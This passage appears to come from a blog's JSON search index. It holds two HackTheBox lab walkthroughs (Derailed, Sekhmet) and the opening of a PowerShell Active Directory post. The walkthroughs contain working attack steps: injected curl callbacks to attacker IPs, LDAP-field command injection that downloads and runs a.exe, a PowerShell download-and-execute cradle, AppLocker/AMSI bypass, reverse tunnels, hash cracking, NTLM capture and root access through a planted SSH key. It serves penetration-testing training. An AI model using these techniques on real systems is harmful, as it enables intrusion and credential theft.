name=\"authenticity_token\" id=\"authenticity_token\" value=\"AUTHENTICITY_TOKEN_HERE\" autocomplete=\"off\"&gt; &lt;input id=\"report_log\" type=\"text\" class=\"form-control\" name=\"report_log\" value=\"REPORT_LOG_HERE\" hidden=\"\"&gt; &lt;button name=\"button\" type=\"submit\"&gt;Submit&lt;/button&gt;', 'text/html'); document.body.append(newForm.forms.badform); document.getElementById('badform').elements.report_log.value = '|curl http://10.10.14.199/rcecfmed'; document.getElementById('badform').elements.authenticity_token.value = token; document.getElementById('badform').submit();}, 3000);NOTE : In this script, you need to modify the variables ip, authenticity_token, and report_log. You can find these in the administrator content.When waiting around, I eventually got a callback via the curl command I injected.We can obtain the user flag while we’re here.To establish persistence, we can place our public key within the ~/.ssh/authorized_keys folder.And we are now inside the machine with SSH.Shell as openmediavault-webguiAfterward, I explored the /var/www/ directory to search for some credentials. /var/www/rails-app/db/We discovered a sqlite3 file at this location. Inside the file, there is a section containing hashes related to Toby and aclice.rails@derailed:/var/www/rails-app/db$ lsdevelopment.sqlite3 migrate schema.rbrails@derailed:/var/www/rails-app/db$ sqlite3 development.sqlite3 SQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .databasesmain: /var/www/rails-app/db/development.sqlite3 r/wsqlite&gt; .tablesar_internal_metadata reports users notes schema_migrations sqlite&gt; SELECT * FROM users;1|alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.|administrator|2022-05-30 18:02:45.319074|2022-05-30 18:02:45.3190742|toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle|user|2022-05-30 18:02:45.542476|2022-05-30 18:02:45.542476105|aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|$2a$12$hSen8wtUb1JdGrAeFHgMAerrv2CZuNvULben7dtCcqcy3s7n0heOq|user|2023-07-21 09:29:11.948646|2023-07-21 09:29:11.948646106|baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|$2a$12$4vsD/ydljiSQoAOa6Cfl2OVtZtwObbQkNdec/kAdQhBmc/PBu.xIi|user|2023-07-21 09:30:06.472350|2023-07-21 09:30:06.472350107|aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb&lt;select&lt;style/&gt;&lt;img src='http://10.10.14.58/imgfail' onerror=\"eval(String.fromCharCode(118,97,114,32,120,109,108,72,116,116,112,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,120,109,108,72,116,116,112,46,111,112,101,110,40,32,34,71,69,84,34,44,32,34,104,116,116,112,58,47,47,100,101,114,97,105,108,101,100,46,104,116,98,58,51,48,48,48,47,97,100,109,105,110....&lt;snippet&gt;It’s interesting that we found two users in the users table1|alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI72|toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyleLet’s check these users from the ‘/etc/passwd’ file.Great! After checking the /etc/passwd file, we have confirmed that the openmediavault-webgui user corresponds to Toby Wright.So let’s crack the toby hash and login with openmediavault-webgui user# Use this for crack the Hashjohn -w=/usr/share/wordlists/rockyou.txt toby_hash # Use this for show the passwordjohn toby_hash --show ?: greenday1 password hash cracked, 0 leftSo the password of openmediavault-webgui user is greendayWith this, we can su to the openmediavault-webgui user.rails@derailed:/var/www/rails-app/db$ su openmediavault-webguiPassword: openmediavault-webgui@derailed:/var/www/rails-app/db$ cd /home/openmediavault-webgui/openmediavault-webgui@derailed:~$ lsopenmediavault-webgui@derailed:~$ ls -latotal 12drwxr-xr-x 3 openmediavault-webgui openmediavault-webgui 4096 Jul 21 05:42 .drwxr-xr-x 5 root root 4096 Nov 20 2022 ..lrwxrwxrwx 1 openmediavault-webgui openmediavault-webgui 9 Nov 4 2022 .bash_history -&gt; /dev/nulldrwx------ 2 openmediavault-webgui openmediavault-webgui 4096 Jul 21 06:08 .sshopenmediavault-webgui@derailed:~$ OpenMediaVaultDuring my earlier observation, I noticed an OMV (OpenMediaVault) instance running on the machine. Running the netstat -lputn command further confirms that it is actively listening on port 80openmediavault-webgui@derailed:~$ netstat -lputn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:34045 0.0.0.0:* LISTEN - tcp 0 0 10.10.11.190:5357 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3003 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:1234 0.0.0.0:* LISTEN 21455/nc tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:46795 0.0.0.0:* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::111 :::* LISTEN - tcp6 0 0 :::139 :::* LISTEN - tcp6 0 0 :::1234 :::* LISTEN 21455/nc tcp6 0 0 :::445 :::* LISTEN - udp 0 0 0.0.0.0:44766 0.0.0.0:* - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp 0 0 0.0.0.0:55393 0.0.0.0:* - udp 0 0 0.0.0.0:111 0.0.0.0:* - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp 0 0 127.0.0.1:323 0.0.0.0:* - udp 0 0 10.10.11.190:3702 0.0.0.0:* - udp 0 0 239.255.255.250:3702 0.0.0.0:* - udp6 0 0 :::111 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 ::1:323 :::* - udp6 0 0 :::44613 :::* - We can confirm that there is a site running on port 80 by using the curl commandopenmediavault-webgui@derailed:~$ curl 127.0.0.1:80&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;openmediavault Workbench&lt;/title&gt; &lt;base href=\"/\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt; &lt;meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt; &lt;link rel=\"icon\" type=\"image/x-icon\" href=\"favicon.ico\"&gt; &lt;link rel=\"apple-touch-icon\" href=\"favicon_180x180.png\"&gt; &lt;link rel=\"icon\" href=\"favicon.svg\" sizes=\"any\" type=\"image/svg+xml\"&gt;&lt;style&gt;@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-cyrillic-ext-400-normal.4543e27a05aa2ba75c44.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+0460-052f,u+1c80-1c88,u+20b4,u+2de0-2dff,u+a640-a69f,u+fe2e-fe2f}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-cyrillic-400-normal.514f4123b1effd5ed0d8.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+0400-045f,u+0490-0491,u+04b0-04b1,u+2116}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-greek-ext-400-normal.18e3b17c2aceabafdd3c.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+1f??}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-greek-400-normal.94fd6d5b2b3cd70f2516.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+0370-03ff}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-vietnamese-400-normal.a1bc9a8f426924c5dea8.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+0102-0103,u+0110-0111,u+0128-0129,u+0168-0169,u+01a0-01a1,u+01af-01b0,u+1ea0-1ef9,u+20ab}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-latin-ext-400-normal.325ea6d33179f07ec7db.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+0100-024f,u+0259,u+1e??,u+2020,u+20a0-20ab,u+20ad-20cf,u+2113,u+2c60-2c7f,u+a720-a7ff}@font-face{font-family:Inter;font-style:normal;font-display:swap;font-weight:400;src:url(inter-latin-400-normal.c96fe5ff771f9e7b53ab.woff2) format(\"woff2\"),url(inter-all-400-normal.e71ac35377dd87cb4d4b.woff) format(\"woff\");unicode-range:u+00??,u+0131,u+0152-0153,u+02bb-02bc,u+02c6,u+02da,u+02dc,u+2000-206f,u+2074,u+20ac,u+2122,u+2191,u+2193,u+2212,u+2215,u+feff,u+fffd}@-webkit-keyframes cdk-text-field-autofill-start{}@-webkit-keyframes cdk-text-field-autofill-end{}body,html{height:100%}body{background-color:#85c3ec;font-family:Inter,Roboto,HelveticaNeue,Helvetica Neue,helvetica,arial,sans-serif;margin:0}&lt;/style&gt;&lt;link rel=\"stylesheet\" href=\"styles.ec2b7e3a2e7cd4cc5964.css\" media=\"print\" onload=\"this.media='all'\"&gt;&lt;noscript&gt;&lt;link rel=\"stylesheet\" href=\"styles.ec2b7e3a2e7cd4cc5964.css\"&gt;&lt;/noscript&gt;&lt;/head&gt;&lt;body&gt; &lt;omv-root&gt;&lt;/omv-root&gt;&lt;script src=\"runtime-es2017.7fa41b39a73c8bd4a330.js\" type=\"module\"&gt;&lt;/script&gt;&lt;script src=\"runtime-es5.7fa41b39a73c8bd4a330.js\" nomodule defer&gt;&lt;/script&gt;&lt;script src=\"polyfills-es5.a484050d1f8658290636.js\" nomodule defer&gt;&lt;/script&gt;&lt;script src=\"polyfills-es2017.12c375302ac169873745.js\" type=\"module\"&gt;&lt;/script&gt;&lt;script src=\"main-es2017.69a1304dec405ae669ca.js\" type=\"module\"&gt;&lt;/script&gt;&lt;script src=\"main-es5.69a1304dec405ae669ca.js\" nomodule defer&gt;&lt;/script&gt;Also, I saw this config file when re-running LinPEAS.Open Media Vault is a network-attached storage system, and I’m interested in exploring it further. To do so, we can use chisel to set up port forwarding.# on attacker machine./chisel server --port 1445 --reverse# on target machine./chisel client --max-retry-count=1 10.10.15.27:1445 R:80:127.0.0.1:80Since I couldn’t find the credentials to log in, I wasn’t able to exploit it. Let’s return to the machine and try to exploit it from the insideShell as root OMV Config /etc/openmediavault/config.xmlThis website on the OMV website was very helpful: [GUIDE] Enable SSH with Public Key Authentication (Securing remote webUI access to OMV)The vulnerability lies in the ownership of the config.xml file by our current user, which allows us to modify it. This enables us to grant SSH access to any user within the machine using a public key of our choice. To exploit this, we need to edit the config.xml file on the machine.Within the machine, there are two entries, one for rails and one for test. We will edit the test entry for the root user and generate the required key in the correct format by using ssh-keygen -t rsa and ssh-keygen -e -f ~/.ssh/id_rsa.pubkeep in mind that we must include the sshpubkey tag since we are defining a new object. Afterward, we need to restart the OMV instance to apply the changes from the new config file. From the OMV documentation, we can use the omv-confdbadm file to do so.openmediavault-webgui@derailed:~$ ssh-keygen -t rsa; ssh-keygen -e -f ~/.ssh/id_rsa.pubGenerating public/private rsa key pair.Enter file in which to save the key (/home/openmediavault-webgui/.ssh/id_rsa): /home/openmediavault-webgui/.ssh/id_rsa already exists.Overwrite (y/n)? yEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/openmediavault-webgui/.ssh/id_rsaYour public key has been saved in /home/openmediavault-webgui/.ssh/id_rsa.pubThe key fingerprint is:SHA256:R6QTaSXzPXQgbEzgpFBrcoAVLmOBc7RgDwYLEICrf5Q openmediavault-webgui@derailedThe key's randomart image is:+---[RSA 3072]----+|%Boo=o. *B= o.. ||Bo=+ o =oB++ . ||.+=.o =.+.o o ||.. o + o . ||. . S . ||. E . || . . || . . || . |+----[SHA256]-----+---- BEGIN SSH2 PUBLIC KEY ----Comment: \"3072-bit RSA, converted by openmediavault-webgui@derailed fr\"AAAAB3NzaC1yc2EAAAADAQABAAABgQC9ybH1LZ6C9EgbEtyL5DMllTbvdqBeDrdDo6VvzerrALONYvojeCXSNe9FQlYbsTsDdUWVTlFkCMKzqc7CL/5XAwPVnmvp6mC8QNgsNU8V6jc+sqpFG8nNi0LG65e0wHbIoppQDC0/+XGQtwsSMhXrkY+Q4DRp+pZMm/H/NWLe/GdJoX0cx1U0ANFatLidwFAck0vU3EZWolNp4TxmbCv7qZVNZPqV4+1B/BWjaDkd4qoq5+GtLq9b9fGI3bUJpoDtY5G9pB42jcdElv+crKen6CHgdzmMy6L6Z0vkB2upv1tTQ4iFuccD5vJ2XhU720iZG+iuN01meZehPuUr82ufNHHoiBzCIHWJmHxvD+no9UpL6n9J7iQouopvhkloDkvuo62lHXH3hIbKeUZ9itsTvD90Wg9PIrKGyKWt+E7aGuNq3uumhPrgq4rk+6p/gXJZGpmPThqkx0cqgZrLl18SDosRJwhoSseXuoYUxwhgGmHIo6JMuH4giY+hMPEIiIU=---- END SSH2 PUBLIC KEY ----openmediavault-webgui@derailed:~$ We can overwrite the config.xml with one crafted with ssh public key id_rsa.pub!Note that we need to add the tag because we are specifying a new object than we can upload a new xml with the crafted info like root inside test and refresh the config&lt;snippet&gt; &lt;/user&gt; &lt;user&gt; &lt;uuid&gt;e3f59fea-4be7-4695-b0d5-560f25072d4a&lt;/uuid&gt; &lt;name&gt;root&lt;/name&gt; &lt;email&gt;&lt;/email&gt; &lt;disallowusermod&gt;0&lt;/disallowusermod&gt; &lt;sshpubkeys&gt; &lt;sshpubkey&gt;---- BEGIN SSH2 PUBLIC KEY ----Comment: \"3072-bit RSA, converted by openmediavault-webgui@derailed fr\"AAAAB3NzaC1yc2EAAAADAQABAAABgQC9ybH1LZ6C9EgbEtyL5DMllTbvdqBeDrdDo6VvzerrALONYvojeCXSNe9FQlYbsTsDdUWVTlFkCMKzqc7CL/5XAwPVnmvp6mC8QNgsNU8V6jc+sqpFG8nNi0LG65e0wHbIoppQDC0/+XGQtwsSMhXrkY+Q4DRp+pZMm/H/NWLe/GdJoX0cx1U0ANFatLidwFAck0vU3EZWolNp4TxmbCv7qZVNZPqV4+1B/BWjaDkd4qoq5+GtLq9b9fGI3bUJpoDtY5G9pB42jcdElv+crKen6CHgdzmMy6L6Z0vkB2upv1tTQ4iFuccD5vJ2XhU720iZG+iuN01meZehPuUr82ufNHHoiBzCIHWJmHxvD+no9UpL6n9J7iQouopvhkloDkvuo62lHXH3hIbKeUZ9itsTvD90Wg9PIrKGyKWt+E7aGuNq3uumhPrgq4rk+6p/gXJZGpmPThqkx0cqgZrLl18SDosRJwhoSseXuoYUxwhgGmHIo6JMuH4giY+hMPEIiIU=---- END SSH2 PUBLIC KEY ----&lt;/sshpubkey&gt; &lt;/sshpubkeys&gt; &lt;/user&gt; &lt;/users&gt;&lt;snippet&gt; /usr/sbinThe /usr/sbin file contains loads of omv related tools too:openmediavault-webgui@derailed:/usr/sbin$ ./omv-confdbadm read conf.system.usermngmnt.user[{\"uuid\": \"30386ffe-014c-4970-b68b-b4a2fb0a6ec9\", \"name\": \"rails\", \"email\": \"\", \"disallowusermod\": false, \"sshpubkeys\": {\"sshpubkey\": []}}, {\"uuid\": \"e3f59fea-4be7-4695-b0d5-560f25072d4a\", \"name\": \"root\", \"email\": \"\", \"disallowusermod\": false, \"sshpubkeys\": {\"sshpubkey\": [\"---- BEGIN SSH2 PUBLIC KEY ----\\nComment: \\\"3072-bit RSA, converted by openmediavault-webgui@derailed fr\\\"\\nAAAAB3NzaC1yc2EAAAADAQABAAABgQDPsdfneMWLTAENR6cBfDLOh84rASxx8/EYM7X+mm\\nLF9zmq0/kOfVqyg1Kcjdj0aJTXQas7i98u4EseF2xKZnaeQGrjk2YWrhDj8hTk7Gql0+lp\\n+rlJMGigaq+YQ+oh4Vop510N+TAiq53mNZR2CEkZ/RB4k4P/9utUbofr14DhhDJ637LBoZ\\nOj0TexCVyVotYjTSHFaZ8SRIQJ4/2Kwd25+hJXtcnWv6mMe39OOnFhB//9ZTdidR71Fyd3\\nx1yMn8846MdWnuXNs/Kl7YzgnCAsmcW7XxsewmwCkHu7hn8RSrPeQAi8omsDQ+6BsOEMRg\\nj38J+DZUZETlu+XlomhNecwNVrsam5ImSDVRLnt9ZcsKmQ8uKcynFrx79xJs2tUrETdTVG\\naaGxH92GZTltF5FOpneJCxB5tczct8vSJnzyDJp/EgGeBrYD3h1APjErR4EK49lY4t0niz\\n6yYrEq8p/a7sX8D2G/XvsegIfMte+2ng8J9YoSpiprtQseMiaFIHE=\\n---- END SSH2 PUBLIC KEY ----\"]}}]and then we have to force ssh with omv-rpc tool :openmediavault-webgui@derailed:/usr/sbin$ ./omv-rpc -u admin \"config\" \"applyChanges\" \"{ \\\"modules\\\": [\\\"ssh\\\"],\\\"force\\\":true}\"nullopenmediavault-webgui@derailed:/usr/sbin$ Now, we can easily SSH into the system using ssh root@derailed.htb, and as a result, we have obtained a shell with root privileges!openmediavault-webgui@derailed:/tmp$ ssh rooterailedssh: Could not resolve hostname rooterailed: Name or service not knownopenmediavault-webgui@derailed:/tmp$ ssh root@derailedDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jul 21 06:29:50 2023 from 127.0.0.1root@derailed:~# lsgoogle\tmeta root.txtroot@derailed:~# cat root.txt 797ea56d36caa4b3d53b************Thanks for reading! if you have any questions or comments, feel free to contact me at emsecpro@gmail.com.Happy hacking! 👾❤️see you guys in another insane box" }, { "title": "HackTheBox-Sekhmet Walkthrough", "url": "/posts/HackTheBox-Sekhmet_/", "categories": "HackTheBox Walkthrough", "tags": "HackTheBox", "date": "2023-03-29 12:00:00 +0000", "snippet": "Hello everyone, This is EmSec, and I'm excited to share my experience of solving the Sekhmet machine from HackTheBox. As an enthusiast of cybersecurity, I've been exploring various hacking challeng...", "content": "Hello everyone, This is EmSec, and I'm excited to share my experience of solving the Sekhmet machine from HackTheBox. As an enthusiast of cybersecurity, I've been exploring various hacking challenges and this machine was truly insane.EnumerationGaining Accessnmap -p- --min-rate 5000 10.10.11.179When trying to head to the webpage, we need to use the www.windcorp.htb domain.Website : Windcorp.htbThe page displays a common corporate website:While looking through the web page, it’s worth noting some names that could be useful later on.I started fuzzing with gobuster and wfuzz because this website possibly contains other subdomains, and I was able to find one at portal.windcorp.htb.ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://www.windcorp.htb/ -H \"Host: FUZZ.windcorp.htb/\" --fw 3Let’s add that to the /etc/hosts file and enumerate there.Website : portal.windcorp.htbA login page greets us at the new domain:Luckly,I attempted to login with admin:admin, and it worked!I didn’t find anything interesting on this page. Therefore, I decided to use Burp Suite to inspect the background activity. As I proxied the traffic, I stumbled upon an intriguing cookie.It appeared as a JWT token, but it was not actually a profile cookie:Furthermore, the website utilized Express as its backend framework, which could assist in identifying potential vulnerabilities related to these cookiesBypassing ModSec (RCE)I encountered an error while attempting to fuzz the login page using SQL Injection payloads.ModSec appears to be the WAF employed to safeguard this webpage, which seems peculiar. Further investigation into Mod Security’s cookie-related exploits unearthed several informative articles, including this one:READ MORE HERE : modsecurity-vulnerability-cve-2019-19886The article explains how the use of a second equals sign within the cookie parameter may result in a DoS condition with Mod Security.From the website’s architecture, it appears to be built on the Express framework. Upon investigating potential vulnerabilities related to cookies and Express, I came across an informative article at exploiting-node-js-deserialization-bug-for-remote-code-execution. It suggests that there may be a deserialization exploit in play, and that ModSec could be a key factor related to the use of cookies.To create a payload, we can follow the tutorial provided in the article. Specifically, we can leverage nodejsshell.py to generate a shell, and then use base64 to encode it.we can encode it by using Burp Suite like so :To bypass ModSec and enable the RCE to work, we needed to add something to the end of the cookie. This additional information would allow the cookie to pass through, and we included it in the final request sent via Burpsuite.I managed to retrieve a shell using this method as a webster user after sending this request.Webserver FootholdAlthough this machine was intended to run on Windows, I found myself in a Linux host, which was very strange. This discovery confirms that there are multiple hosts with different operating systems on this box, likely related to Active Directory.ZIP CrackingI found that backup.zip interesting,But when attempting to unzip it, we noticed that the file is password-protected and contains the /etc/passwd file. Additionally, there are numerous other files related to Active Directory, including GPOs and Kerberos configurations.I was struck by how peculiar it was to come across a random zip file here. Despite my attempts to crack the hash, I couldn’t make any headway. So, I decided to transfer the file back to my machine and use ‘7z l -slt’ to scrutinize the technical details of the zip file.on the target:nc -w 4 10.10.14.xx 1234 &lt; backup.zipon attacker :nc -lnv &gt; backup.zip7z l -slt backup.zipSince ZipCrypto Deflate was used, The bkcrack exploit could be employed on this file because of the outdated encryption method it employs.To exploit this:# create a new zip of the passwd filecp /etc/passwd .zip passwd.zip passwd# use bkcrack to crack the keys./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd# use the codes found to create a new zip file with a known password./bkcrack -C backup.zip -U cracked.zip password -k &lt;code1&gt; &lt;code2&gt; &lt;code3&gt;it take some time but its works fine.This should create a new zip file that we can open easily.Now, let’s examine the files contained within this zip folder more thoroughly.Enumeration FilesLooking through the zip file, I came across numerous configuration files. My attention was immediately drawn to the /var/lib/sss/db directory, which contained several ldb files.I discovered a credential by running the ‘strings’ command on the cache_windcorp.htb.ldb file, which revealed that the associated user was ‘ray.duncan’And he has a hashed password within this folder.This hash can be cracked easily by using hashcat or john :.\\hashcat.exe -m 1800 .\\hash.txt .\\rockyou.txt`Now that we possess some credentials, performing additional enumeration on the files exposes the presence of other networks on this machineThe KDC (and therefore DC) of this machine was found to be at 192.168.0.2. The other database files contained references to a domain called hope.windcorp.htbI was stuck here for a while because I was trying to log in to SSH with just “ray.duncan”, but then I realized that we need to log in with the domain name, like this: “ray.duncan@windcorp.htb” (yes, that’s his username)We are now on the same web server host with persistence enabled. After confirming that this machine is related to Active Directory and dealing with Kerberos-related issues, we can request and cache a ticket via kinit. Further research on how to use a ticket in Linux led me to ksu, which essentially functions like su but with Kerberos support.By using these commands, we can elevate our privileges to root on this container and obtain the user flag.Let’s now explore ways to enumerate Active Directory. This machine is quite lengthy.Active DirectoryAfter discovering another IP address at 192.168.0.2, our next task was to enumerate the open ports on that machine. To accomplish this, we can either use the Nmap binary or run this one-liner to determine which ports are currently open:for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z &amp; done 2&gt; output.txtFrom here, we can see some ports that are open.It’s now confirmed that the genuine DC is located at 192.168.0.2 To proceed with the enumeration process, we’ll have to utilize chisel and proxychains to route traffic towards that address.# on attacker machine./chisel server --port 1337 --reverse# on target machine./chisel client --max-retry-count=1 10.10.14.149:1337 R:1080:socksEnumerating the DC with proxychains works fine later on:proxychains curl http://192.168.0.2Let’s begin by enumerating the domain properly. My initial observation was the open port 53 for DNS in the output. We can utilize ‘dig’ to discover more information.Silver Ticket and SMB SharesWith the credentials for ray.duncan, we can actually request a ticket for him. This can be done using impacket-getST.proxychains impacket-getST -dc-ip 192.168.0.2 -spn cifs/hope.windcorp.htb 'windcorp/ray.duncan:pantera'export KRB5CCNAME=ray.duncan.ccacheklist #to display the Ticket cacheWIth this ticket, we can check out the shares within the domain, since SMB was open on the host.and we can see that WC-Share is interestingproxychains impacket-smbclient ray.duncan@hope.windcorp.htb -k -no-passWithin this debug-users.txt file, we find an interesting output.I wasn’t sure what to do with this, but we can keep it for now I guess.LDAP Enum + RCEAfter finding nothing of interest in SMB, I proceeded to perform LDAP enumeration by utilizing the ‘ldapsearch’ command to extract information from the container. To access the necessary permissions, I leveraged the ticket cached for ray.duncan earlier with kinit.Analysing the information, we notice that the numbers and users and numbers we found earlier on the shares are present in the mobile field for users.I was wondering what this parameter was used for, and why was it hinted at. The first thing that comes to mind is testing for RCE or other injection payloads. To modify LDAP entries, we would need to use ldapmodify. This also involves the creation of LDIF files.READ MORE HERE : How To Use LDIF Files to Make Changes to an OpenLDAP System I created this LDIF file first to test. Then I updated the entry and was surprised to get a hit back after a minute!dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htbchangetype: modifyreplace: mobilemobile: 1;curl http://10.10.14.149/rcecfmedldapmodify -Y GSSAPI -H ldap://windcorp.htb -D \"CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb\" -f change.ldifThis confirms we have RCE. Now, we can attempt to gain a reverse shell on the machine. I tried downloading nc.exe on the machine, and noticed that there was a character limit on the mobile entry. Anyways, downloading the file to C:\\Windows\\Tasks\\ works, but it does not seem to execute to give me my shell.AMSI + AppLocker BypassIt’s possible that a Windows security feature was preventing the reverse shell from running on the machine. I attempted to access various directories, including AppLocker, but encountered the same issue. If AppLocker is in use, it’s possible that AMSI is also active, which means we can’t simply use nc.exe to establish the reverse shell. Instead, we may need to create a new executable.Due to character limitations, we’ll need to create a .exe file for the reverse shell. To do so, I started searching for potential payloads on a Windows virtual machine. MinatoTW’s repository proved particularly useful in this regardMinatoTW github : CLMBypassBlogpostAlso you need to read : Powershell CLM Bypass Using Runspaces put the CLMBypassBlogpost repository on your Windows VM ,and Within the code of Program.cs, I changed the command executed to download Invoke-PowerShellTcp from our machine.String exec = \"iex(new-object net.webclient).downloadstring('http://10.10.14.149/emsec')\"; // Modify for custom commandsThen, we can compile it using csc.exe within our Windows machine.C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:System.Management.Automation.dll Program.csNote : you will find System.Management.Automation.dll file CLMBypassBlogpost-master\\Bypass\\packages\\System.Management.Automation.dll.10.0.10586.0\\lib\\net40 , you can (you can transfer it to the main file)We transferred the program.exe to our attacker machine and changed its name to a.exe to ignore any character limitations. If you have Python 3 installed on your Windows virtual machine, you can start a web server with the following command:python -m http.server 8000On our attacker machine, we need to create another file containing our shell (I used the Invoke-PowerShellTcp.ps1 script from Nishang Shells), and then start a Python 3 web server :on root@webserver change the change.ldif as shown below:dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htbchangetype: modifyreplace: mobilemobile: 1;curl http://10.10.14.149/a.exe -o C:\\Windows\\Debug\\wiaand run :ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D \"CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb\" -f change.ldifWhen you receive a hint on your Python3 web server, immediately modify change.ldif as shown below to run a.exe:dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htbchangetype: modifyreplace: mobilemobile: 1;start C:\\Windows\\Debug\\wia\\a.exereuse ldapmodify,Then set up your netcat and wait for your shell start: Eventually, you'll get a shell. Note : The shell is a bit buggy if we leave the LDAP entry that is executing the payload to continue running, so I changed it back to numbers after getting the shell to prevent this from happening.Privilege EscalationEnumerationnet group \"Domain Admins\"Seems that bob.wood is both a user and an admin. Perhaps, he is using the same device to switch between user and administrator accounts. We’ll keep this in mind for later.I ran WinPEAS within the machine in the C:\\Windows\\Debug\\wia directory to bypass AppLocker once more.We can check to see that the NTLM settings are insecure:NTLMv2 is the legacy protocol that uses the challenge-response method of authenticating users, and this involves sending the user hash. This means that the next step is to intercept this response and capture the hash.NTLM LeakFor some reason, it wouldn’t let me authenticate to my own SMB server from the DC. To circumvent this, we can head to the compromised webserver container and run smbserver there.First, we can find out the webserver’s domain name:Then, we can simply use a smbserver binary from here: impacket static binariesHere’s the output of that:# on webserver containerchmod +x smbserver./smbserver share . -smb2support# on DCnet use \\\\webserver.windcorp.htb\\shareWe can then crack this hash using john or hashcat.Bob.WoodNow that we have one set of credentials, we can think about how to gain a shell on bob.wood. I tried remote Powershell with the credentials, and found that they were re-used!$SecPassword = ConvertTo-SecureString '!@p%i&amp;J#iNNo1T2' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('bob.wood', $SecPassword)$session = New-PSSession -Credential $Cred Invoke-Command -Session $session -scriptblock { whoami }With this, we can gain another shell on the host using the same binary that bypassed AppLocker and AMSI.Invoke-Command -Session $session -scriptblock { C:\\Windows\\Debug\\wia\\a.exe }Bob.WoodadmWe already know that Bob.Wood has another account on the domain with administrator privileges. Perhaps the credentials for the administrator are hidden somewhere on this account, perhaps in some file or cache.I could not run winPEAS for some reason, always crashed my shell. So I manually enumerated the box. I checked for app caches, hidden files, and browser caches. In the C:\\Users\\Bob.Wood\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default file, there was a Login Data file which looked rather suspicious.There was mention of the bob.woodADM user here.I went to search for Github Repos with tools that could decrypt this thing, and eventually found one here: HackBrowserDataThis tool would help us decrypt the data we need. We can download this to the machine. We can run this thing, and see that it successfully dumps out data from the browser.And we can find the credentials for bob.woodadm.Now, we can attempt some remote Powershell again. Then, it finally rooted. " }, { "title": "Active Directory Management - A PowerShell Journey", "url": "/posts/ActiveDirectory_Management_with_Powershell/", "categories": "Powershell, AD DC", "tags": "Active Directory, powershell", "date": "2022-11-23 13:00:00 +0100", "snippet": "Mastering Active Directory: A PowerShell OdysseyIntroduction to PowerShell and Active DirectoryPowerShell plays a crucial role in efficiently managing Active Directory, offering powerful cmdlets th...", "content": "Mastering Active Directory: A PowerShell OdysseyIntroduction to PowerShell and Active DirectoryPowerShell plays a crucial role in efficiently managing Active Directory, offering powerful cmdlets that streamline various administrative tasks. In this section, we’ll provide a brief overview of PowerShell and highlight its significance in the context of Active Directory.Brief Overview of 